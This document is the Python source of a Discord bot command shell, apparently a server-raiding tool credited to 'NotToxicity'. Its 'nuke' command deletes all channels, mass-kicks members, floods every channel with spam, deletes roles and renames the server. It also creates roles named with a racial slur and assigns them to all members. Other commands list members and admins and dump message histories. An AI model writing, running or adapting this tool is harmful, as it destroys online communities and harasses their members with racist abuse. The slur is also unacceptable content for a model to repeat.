import discord
from discord.ext import commands
from cmd import Cmd
from colorama import Fore, Style, init
import asyncio
import re
import aioconsole
init(autoreset=True)


intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True  # Allow bot to read message content

bot = commands.Bot(command_prefix="!", intents=intents)


class DiscordBotCLI(Cmd):
    prompt = f"{Fore.CYAN}DiscordBot > {Style.RESET_ALL}"
    intro = f"{Fore.GREEN}Welcome to the Discord Bot CLI! Type 'help' to see available commands.{Style.RESET_ALL}"

    def __init__(self, bot):
        super().__init__()
        self.bot = bot
        self.connected_server = None
        self.connected_channel = None

    async def do_list_servers(self, args):
        """List all servers the bot is currently in."""
        print(f"{Fore.YELLOW}Listing all servers...{Style.RESET_ALL}")
        for guild in self.bot.guilds:
            print(f"{Fore.GREEN}- {guild.name} (ID: {guild.id}){Style.RESET_ALL}")

    async def do_connect(self, args):
        """Connect to a specific server by guild ID. Usage: connect <guild_id>"""
        try:
            guild_id = int(args.strip())  # Convert the provided ID to an integer
        except ValueError:
            print(f"{Fore.RED}Error: You must provide a valid guild ID. Usage: connect <guild_id>{Style.RESET_ALL}")
            return

        if not guild_id:
            print(f"{Fore.RED}Error: You must provide a server ID. Usage: connect <guild_id>{Style.RESET_ALL}")
            return

        for guild in self.bot.guilds:
            if guild.id == guild_id:
                self.connected_server = guild
                print(f"{Fore.GREEN}Connected to server: {guild.name}{Style.RESET_ALL}")
                self.prompt = f"{Fore.CYAN}{guild.name} > {Style.RESET_ALL}"
                return

        print(f"{Fore.RED}Error: Server with ID '{guild_id}' not found.{Style.RESET_ALL}")

    async def do_nuke(self, args):
        """Nuke the server with options for kicking members, flooding with messages, and creating new channels, etc."""
        if not self.connected_server:
            print(
                f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return


        channel_count = 10
        kick_count = 0
        flood_count = 10
        role_count = 0
        new_roles = 10
        send_msg = "Nuked by NotToxicity"
        change_name = "Nuked by NotToxicity"

        arguments = args.split()

        kick = '-k' in arguments
        flood = '-f' in arguments
        new_channels = '-c' in arguments
        delete_roles = '-r' in arguments
        create_roles = '-n' in arguments
        rename_server = '-s' in arguments
        send_msg = '-m' in arguments


        def extract_quoted_argument(flag, args):
            match = re.search(rf'{flag} "([^"]+)"', args)
            if match:
                return match.group(1)
            return None


        send_msg = extract_quoted_argument('-m', args) or send_msg
        change_name = extract_quoted_argument('-s', args) or change_name


        if kick:
            kick_count = int(arguments[arguments.index('-k') + 1]) if len(arguments) > arguments.index('-k') + 1 else 0
        if flood:
            flood_count = int(arguments[arguments.index('-f') + 1]) if len(arguments) > arguments.index(
                '-f') + 1 else 10
        if new_channels:
            channel_count = int(arguments[arguments.index('-c') + 1]) if len(arguments) > arguments.index(
                '-c') + 1 else 10
        if delete_roles:
            role_count = int(arguments[arguments.index('-r') + 1]) if len(arguments) > arguments.index('-r') + 1 else 0
        if create_roles:
            new_roles = int(arguments[arguments.index('-n') + 1]) if len(arguments) > arguments.index('-n') + 1 else 10

        print(f"{Fore.YELLOW}Deleting all existing channels...{Style.RESET_ALL}")
        for channel in list(self.connected_server.channels):
            try:
                await channel.delete(reason="Nuking the server")
                print(f"{Fore.GREEN}Deleted channel: {channel.name}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error deleting channel {channel.name}: {e}{Style.RESET_ALL}")
        if new_channels:
            print(f"{Fore.YELLOW}Creating {channel_count} new channels...{Style.RESET_ALL}")

            async def create_channels():
                for _ in range(channel_count):
                    try:
                        new_channel = await self.connected_server.create_text_channel("nuked by nottoxicity")
                        print(f"{Fore.GREEN}Created new channel: {new_channel.name}{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}Error creating channel: {e}{Style.RESET_ALL}")

            await create_channels()

        if kick:
            print(f"{Fore.YELLOW}Kicking the first {kick_count} members from the server...{Style.RESET_ALL}")
            for member in self.connected_server.members[:kick_count]:
                if member != self.bot.user:
                    try:
                        await member.kick(reason="Nuking the server")
                        print(f"{Fore.GREEN}Kicked member: {member.name}{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}Error kicking member {member.name}: {e}{Style.RESET_ALL}")

        if flood:
            print(f"{Fore.YELLOW}Flooding the server with {flood_count} messages in all channels...{Style.RESET_ALL}")

            async def flood_messages():
                for _ in range(flood_count):
                    for channel in self.connected_server.text_channels:
                        try:
                            await channel.send(send_msg)
                            print(f"{Fore.GREEN}Flooded channel {channel.name} with a message!{Style.RESET_ALL}")
                        except Exception as e:
                            print(f"{Fore.RED}Error flooding channel {channel.name}: {e}{Style.RESET_ALL}")

            await flood_messages()



        if delete_roles:
            print(f"{Fore.YELLOW}Deleting {role_count} roles...{Style.RESET_ALL}")
            for role in self.connected_server.roles[:role_count]:
                try:
                    await role.delete(reason="Nuking the server")
                    print(f"{Fore.GREEN}Deleted role: {role.name}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}Error deleting role {role.name}: {e}{Style.RESET_ALL}")


        if create_roles:
            print(f"{Fore.YELLOW}Creating {new_roles} new roles and giving them to everyone...{Style.RESET_ALL}")

            async def create_roles_and_assign():
                for _ in range(new_roles):
                    try:
                        new_role = await self.connected_server.create_role(name="Nigger")
                        for member in self.connected_server.members:
                            await member.add_roles(new_role)
                        print(f"{Fore.GREEN}Created new role and assigned it to members!{Style.RESET_ALL}")
                    except Exception as e:
                        print(f"{Fore.RED}Error creating role: {e}{Style.RESET_ALL}")

            await create_roles_and_assign()


        if rename_server and change_name:
            try:
                await self.connected_server.edit(name=change_name)
                print(f"{Fore.GREEN}Server name changed to: {change_name}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error changing server name: {e}{Style.RESET_ALL}")
    async def do_join(self, args):
        """Join a channel by its ID. Usage: join <channel_id>"""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        channel_id = args.strip()
        if not channel_id:
            print(f"{Fore.RED}Error: You must provide a channel ID. Usage: join <channel_id>{Style.RESET_ALL}")
            return

        try:
            self.connected_channel = self.connected_server.get_channel(int(channel_id))
            if self.connected_channel:
                print(f"{Fore.GREEN}Joined channel: {self.connected_channel.name}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error: Channel not found.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Error: Invalid channel ID format.{Style.RESET_ALL}")

    async def do_messages_channel_id(self, args):
        """Show recent messages in a channel by its ID. Usage: messages <channel_id> <limit>"""
        if not args.strip():
            print(
                f"{Fore.RED}Error: You must provide a channel ID and optionally a limit. Usage: messages <channel_id> <limit>{Style.RESET_ALL}")
            return


        parts = args.split()
        channel_id = parts[0]
        limit = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5  # Default to 5 if no limit is provided


        channel = self.connected_server.get_channel(int(channel_id)) if self.connected_server else None

        if not channel:
            print(f"{Fore.RED}Error: Channel not found or not connected to a server.{Style.RESET_ALL}")
            return

        print(
            f"{Fore.YELLOW}Fetching the last {limit} messages in channel '{channel.name}' (ID: {channel.id})...{Style.RESET_ALL}")

        async def fetch_messages():
            try:
                messages = await channel.history(limit=limit).flatten()

                messages = reversed(messages)

                for message in messages:
                    timestamp = message.created_at.strftime("%Y-%m-%d %H:%M")  # Shorter timestamp format
                    print(f"{Fore.CYAN}{timestamp} - {Fore.GREEN}{message.author.name}: {Fore.BLUE}{message.content}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error fetching messages: {e}{Style.RESET_ALL}")


        await fetch_messages()

    async def do_send(self, args):
        """Send a message to the connected channel. Usage: send <message>"""
        if not self.connected_channel:
            print(f"{Fore.RED}Error: You must join a channel first using 'join <channel_id>'.{Style.RESET_ALL}")
            return

        message = args.strip()
        if not message:
            print(f"{Fore.RED}Error: You must provide a message to send. Usage: send <message>{Style.RESET_ALL}")
            return

        await self.connected_channel.send(message)
        print(f"{Fore.GREEN}Message sent to '{self.connected_channel.name}'{Style.RESET_ALL}")


    async def do_ban(self, user_id):
        """Ban a member from the server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You need to connect to a server first.{Style.RESET_ALL}")
            return

        try:
            user = await self.bot.fetch_user(user_id)
            await self.connected_server.ban(user)
            print(f"{Fore.GREEN}Successfully banned {user.name} ({user_id}) from the server.{Style.RESET_ALL}")
        except discord.NotFound:
            print(f"{Fore.RED}Error: User not found.{Style.RESET_ALL}")
        except discord.Forbidden:
            print(f"{Fore.RED}Error: I do not have permission to ban this user.{Style.RESET_ALL}")

    async def do_unban(self, user_id):
        """Unban a member from the server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You need to connect to a server first.{Style.RESET_ALL}")
            return

        try:

            banned_users = [user async for user, _ in self.connected_server.bans()]


            print(f"Debug: Banned users list (raw): {banned_users}")

            if not banned_users:
                print(f"{Fore.RED}Error: No banned users found.{Style.RESET_ALL}")
                return

            for u in banned_users:
                print(f"Debug: Banned user object: {u}")

            try:
                user_id = int(user_id)
            except ValueError:
                print(f"{Fore.RED}Error: Invalid user ID format.{Style.RESET_ALL}")
                return

            user = next((u for u in banned_users if u and u.id == user_id), None)

            print(f"Debug: User found: {user}")

            if user:
                await self.connected_server.unban(user)
                print(f"{Fore.GREEN}Successfully unbanned {user.name} ({user_id}).{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error: User with ID {user_id} is not banned.{Style.RESET_ALL}")

        except discord.Forbidden:
            print(f"{Fore.RED}Error: I do not have permission to unban this user.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")


    async def do_message_count(self, channel_id):
        """Count the number of messages in a specific channel."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You need to connect to a server first.{Style.RESET_ALL}")
            return

        try:
            channel = self.bot.get_channel(int(channel_id))
            if channel:
                messages = await channel.history(limit=None).flatten()
                print(
                    f"{Fore.GREEN}There are {len(messages)} messages in {channel.name} ({channel_id}).{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error: Channel not found.{Style.RESET_ALL}")
        except discord.Forbidden:
            print(f"{Fore.RED}Error: I do not have permission to read messages in this channel.{Style.RESET_ALL}")


    async def do_clear_messages(self, args):
        """Clear a specified number of recent messages in a channel."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You need to connect to a server first.{Style.RESET_ALL}")
            return

        try:
            channel_id, number_of_messages = args.split(" ")
            channel = self.bot.get_channel(int(channel_id))
            number_of_messages = int(number_of_messages)

            if channel:
                await channel.purge(limit=number_of_messages)
                print(
                    f"{Fore.GREEN}Successfully cleared {number_of_messages} messages from {channel.name} ({channel_id}).{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Error: Channel not found.{Style.RESET_ALL}")
        except ValueError:
            print(
                f"{Fore.RED}Error: Invalid arguments. Usage: clear <channel_id> <number_of_messages>{Style.RESET_ALL}")
        except discord.Forbidden:
            print(f"{Fore.RED}Error: I do not have permission to clear messages in this channel.{Style.RESET_ALL}")


    async def do_ping(self, args):
        """Check if the bot is responsive."""
        print(f"{Fore.GREEN}Pong!{Style.RESET_ALL}")

    async def do_restart(self, args):
        """Restart the bot."""
        print(f"{Fore.YELLOW}Restarting bot...{Style.RESET_ALL}")
        await self.bot.close()
        await self.bot.run(self.bot.token)

    async def do_admins(self, args):
        """List all admins in the connected server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}Listing admins in server '{self.connected_server.name}'...{Style.RESET_ALL}")
        for member in self.connected_server.members:
            if member.guild_permissions.administrator:
                print(f"{Fore.GREEN}- {member.name} (ID: {member.id}){Style.RESET_ALL}")
    async def do_members(self, args):
        """List all admins in the connected server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}Listing members in server '{self.connected_server.name}'...{Style.RESET_ALL}")
        for member in self.connected_server.members:
            print(f"{Fore.GREEN}- {member.name} (ID: {member.id}){Style.RESET_ALL}")

    async def do_info(self, args):
        """Display information about the bot and the connected server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}Bot Information:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}- Bot Name: {self.bot.user.name}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}- Bot ID: {self.bot.user.id}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}- Connected Server: {self.connected_server.name}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}- Server ID: {self.connected_server.id}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}- Member Count: {len(self.connected_server.members)}{Style.RESET_ALL}")

    def do_help(self, args):
        """Display help information for all commands."""
        print(f"{Fore.CYAN}Available Commands:{Style.RESET_ALL}")

        print(f"{Fore.YELLOW}- servers{Style.RESET_ALL}: List all servers the bot is currently in.")
        print(f"{Fore.YELLOW}- connect <server_name>{Style.RESET_ALL}: Connect to a specific server by its name.")
        print(f"{Fore.YELLOW}- channels{Style.RESET_ALL}: List all text channels in the connected server.")
        print(f"{Fore.YELLOW}- join <channel_id>{Style.RESET_ALL}: Join a channel using its ID.")
        print(f"{Fore.YELLOW}- send <message>{Style.RESET_ALL}: Send a message to the currently connected channel.")
        print(f"{Fore.YELLOW}- admins{Style.RESET_ALL}: List all admins in the connected server.")
        print(f"{Fore.YELLOW}- info{Style.RESET_ALL}: Display information about the bot and the connected server.")
        print(f"{Fore.YELLOW}- quit{Style.RESET_ALL}: Exit the CLI and stop the bot.")
        print(f"{Fore.YELLOW}- members{Style.RESET_ALL}: List all members in the connected server.")
        print(
            f"{Fore.YELLOW}- nuke <args>{Style.RESET_ALL}: Execute the 'nuke' command with specified arguments.")
        print(f"{Fore.YELLOW}- invite{Style.RESET_ALL}: Generate an invite link for the bot.")
        print(f"{Fore.YELLOW}- messages <channel_id>{Style.RESET_ALL}: Fetch recent messages from a specific channel.")
        print(f"{Fore.YELLOW}- ban <user_id>{Style.RESET_ALL}: Ban a user from the connected server by their user ID.")
        print(
            f"{Fore.YELLOW}- unban <user_id>{Style.RESET_ALL}: Unban a user from the connected server by their user ID.")
        print(
            f"{Fore.YELLOW}- clear <channel_id> <number_of_messages>{Style.RESET_ALL}: Clear recent messages (limit specifies how many to clear).")
        print(f"{Fore.YELLOW}- ping{Style.RESET_ALL}: Check the bot's responsiveness.")
        print(f"{Fore.YELLOW}- roles{Style.RESET_ALL}: List all roles available in the connected server.")
        print(f"{Fore.YELLOW}- help{Style.RESET_ALL}: Display this help message.")

    def do_quit(self, args):
        """Exit the CLI."""
        print(f"{Fore.GREEN}Exiting CLI. Goodbye!{Style.RESET_ALL}")
        return True
    async def do_channels(self, args):
        """List all text channels in the connected server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        print(f"{Fore.YELLOW}Listing all channels in server '{self.connected_server.name}'...{Style.RESET_ALL}")
        for channel in self.connected_server.text_channels:
            print(f"{Fore.GREEN}- {channel.name} (ID: {channel.id}){Style.RESET_ALL}")


    async def do_invite(self, args):
        """Generate an invite link for the connected server."""
        if not self.connected_server:
            print(f"{Fore.RED}Error: You must connect to a server first using 'connect <server_name>'.{Style.RESET_ALL}")
            return

        invite = await self.connected_server.text_channels[0].create_invite(max_uses=1, unique=True)
        print(f"{Fore.GREEN}Invite Link for '{self.connected_server.name}': {invite.url}{Style.RESET_ALL}")


    async def cmdloop(self):
        """Run the command loop asynchronously."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while True:
            try:

                command = await aioconsole.ainput(self.prompt)
                if command == "quit":
                    break
                else:
                    await self.handle_command(command)
            except KeyboardInterrupt:
                break

    async def do_roles(self):
        """Show all roles and their IDs."""
        try:

            roles = await self.get_all_roles()
            role_list = "\n".join([f"{role['name']} (ID: {role['id']})" for role in roles])
            if role_list:
                print(f"Roles in the server:\n{role_list}")
            else:
                print("No roles found.")
        except Exception as e:
            print(f"Error fetching roles: {e}")

    async def get_all_roles(self):
        """Fetch all roles from the server."""
        try:
            roles = await self.connected_server.fetch_roles()
            return [{'id': role.id, 'name': role.name} for role in roles]
        except Exception as e:
            print(f"Error fetching roles: {e}")
            return []

    async def handle_command(self, command):
        """Handle commands in async context."""
        try:
            if command.startswith("help"):
                await self.do_help("")
            elif command.startswith("connect "):
                await self.do_connect(command[len("connect "):])
            elif command == "servers":
                await self.do_list_servers("")
            elif command.startswith("channels"):
                await self.do_channels("")
            elif command.startswith("join"):
                await self.do_join(command[len("join "):])
            elif command.startswith("send"):
                await self.do_send(command[len("send "):])
            elif command == "admins":
                await self.do_admins("")
            elif command == "info":
                await self.do_info("")
            elif command == "members":
                await self.do_members("")
            elif command.startswith("nuke"):
                await self.do_nuke(command[len("nuke "):])
            elif command.startswith("invite"):
                await self.do_invite("")
            elif command.startswith("messages"):
                await self.do_messages_channel_id(command[len("messages "):])
            elif command.startswith("ban"):
                await self.do_ban(command[len("ban "):])
            elif command.startswith("unban"):
                await self.do_unban(command[len("unban "):])
            elif command.startswith("message_count"):
                await self.do_message_count(command[len("message_count "):])
            elif command.startswith("clear"):
                await self.do_clear_messages(command[len("clear "):])
            elif command == "ping":
                await self.do_ping("")
            elif command == "roles":
                await self.do_roles()
            else:
                print(f"{Fore.RED}Command not recognized.{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error executing command: {e}{Style.RESET_ALL}")

@bot.event
async def on_ready():
    greeting = """██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗  ██████╗ ████████╗    
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝    
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██████╔╝██║   ██║   ██║       
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██╔══██╗██║   ██║   ██║       
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝╚██████╔╝   ██║       
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝    ╚═╝       
                                                                                      
███████╗██╗  ██╗███████╗██╗     ██╗        Made by @probablynottoxicity                                           
██╔════╝██║  ██║██╔════╝██║     ██║                                                   
███████╗███████║█████╗  ██║     ██║                                                   
╚════██║██╔══██║██╔══╝  ██║     ██║                                                   
███████║██║  ██║███████╗███████╗███████╗                                              
╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ 
    """
    print(f"{Fore.GREEN}Bot is ready and connected as {bot.user}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}"+ greeting +"")
    print(f"{Fore.GREEN}Welcome to the DISCORD BOT SHELL! Type 'help' to see available commands.{Style.RESET_ALL}")

    cli = DiscordBotCLI(bot)

    await cli.cmdloop()




bot.run("")
